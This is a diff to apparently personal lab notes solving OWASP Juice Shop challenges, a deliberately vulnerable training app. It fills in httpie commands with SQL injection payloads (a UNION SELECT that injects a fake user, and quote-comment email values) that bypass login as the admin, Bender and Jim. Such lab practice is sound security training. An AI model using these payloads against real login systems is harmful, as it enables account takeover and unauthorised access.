@@ -3,6 +3,7 @@
 Resources
 
 * [SQL injection](https://portswigger.net/web-security/sql-injection)
+* [NoSQL injection](https://portswigger.net/web-security/nosql-injection)
 
 ## Reconnaissance
 
@@ -70,25 +71,26 @@ http http://juiceshop:3000/rest/user/login email=\' password=foo
     }
 }
 
-http http://juiceshop:3000/rest/user/login email="acc0unt4nt@juice-sh.op' OR 1=1--"
+# add static user to result
+http http://juiceshop:3000/rest/user/login email="' UNION SELECT 999,'myUsername','acc0unt4nt@juice-sh.op','myPassword','accounting','','0.0.0.0','','','1','2023-10-28 15:47:25.395 +00:00','2023-10-28 15:47:25.395 +00:00','NULL' FROM Users'--"
 ```
 
 ## Log in with the administrator's user account
 
 ```bash
-TODO
+http http://juiceshop:3000/rest/user/login email="admin@juice-sh.op'--"
 ```
 
 ## Log in with Bender's user account
 
 ```bash
-TODO
+http http://juiceshop:3000/rest/user/login email="bender@juice-sh.op'--"
 ```
 
 ## Log in with Jim's user account
 
 ```bash
-TODO
+http http://juiceshop:3000/rest/user/login email="jim@juice-sh.op'--"
 ```
 
 ## Let the server sleep for some time
